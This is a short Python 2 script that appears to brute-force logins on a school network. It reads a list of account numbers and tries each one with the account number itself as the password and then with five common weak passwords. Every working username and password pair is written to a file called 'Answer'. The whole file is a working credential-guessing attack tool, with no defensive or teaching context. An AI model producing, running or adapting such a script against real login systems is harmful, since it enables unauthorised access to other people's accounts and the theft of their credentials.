# -*- coding: UTF-8 -*-
import os
import HTMLParser
import urlparse
import urllib
import urllib2
import cookielib
import string
import re
import logging
from login_school_net import *
F = open('number','r')
Password = ['123456','654321','888888','666666','111111']

def Get(Number):
	Number = Number.strip()
	if login_school_net(Number,Number):
		Ans = open("Answer", 'a')
		Ans.write(Number + ' ' + Number + '\n')
		# Ans.close()
	for i in Password:
		if login_school_net(Number,i):
			Ans = open("Answer", 'a')
			Ans.write(Number + ' ' + i + '\n')
			# Ans.close()
			return

F = F.readlines()

for i in F:
	try:
		print i
		Get(i)
	except Exception, e:
		logging.error("error" + i)
